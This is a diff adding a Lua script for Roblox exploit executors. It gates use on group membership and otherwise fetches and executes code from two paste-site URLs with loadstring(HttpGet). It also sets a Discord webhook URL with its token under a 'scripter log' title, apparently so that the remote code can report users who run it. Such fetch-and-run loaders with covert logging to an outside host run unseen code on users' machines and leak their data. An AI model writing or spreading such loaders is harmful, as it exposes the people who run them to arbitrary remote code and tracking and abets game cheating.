@@ -1,0 +1,51 @@
+local id, p, g = 35655715, game:GetService("Players").LocalPlayer, game:GetService("StarterGui")
+
+if not p:IsInGroup(id) then
+    if setclipboard then
+        setclipboard("https://www.roblox.com/groups/"..id)
+    elseif toclipboard then
+        toclipboard("https://www.roblox.com/groups/"..id)
+    elseif setrbxclipboard then
+        setrbxclipboard("https://www.roblox.com/groups/"..id)
+    end
+
+    pcall(function() 
+        g:SetCore("ResetCoreGuiEnabled", true) 
+    end)
+
+    for _, v in ipairs({{"ACCESS DENIED", "JOIN THE GROUP TO USE THIS!"}, {"GROUP LINK COPIED", "!~~!"}}) do
+        g:SetCore("SendNotification", {
+            Title = v[1],
+            Text = v[2],
+            Duration = 5
+        }) 
+        task.wait(0.01)
+    end
+else
+    local success, result = pcall(function()
+        return loadstring(game:HttpGet("https://pastefy.app/UhbX9ztw/raw"))()
+    end)
+
+    if not success then
+        warn("Failed to load the script: " .. tostring(result))
+    end
+
+    getgenv().Title = "<^>𝐒𝐂𝐑𝐈𝐏𝐓𝐄𝐑 𝐋𝐎𝐆<^>"
+    getgenv().ThumbnailUrl = "https://i.imgur.com/QmNN2Yg.png"
+    getgenv().Color = 0x000000
+
+    getgenv().FieldTitle = "Script Used:"
+    getgenv().FieldText = 'TexttttttttttNameeeeeeOfscript'
+
+    getgenv().Webhook = "https://discord.com/api/webhooks/1349705228806520883/Zb-nxossWJM1Iiove8G5Mg6AKqir-7SKvOfm83g2RWNY9W2vfDjk6eorkxjoQqKk2OkR"
+
+    coroutine.wrap(function()
+        local scriptSuccess, scriptError = pcall(function()
+            return loadstring(game:HttpGet("https://hasteb.in/wBn16cCqjpNaFaj"))()
+        end)
+
+        if not scriptSuccess then
+            warn("Failed to execute script: " .. tostring(scriptError))
+        end
+    end)()
+end
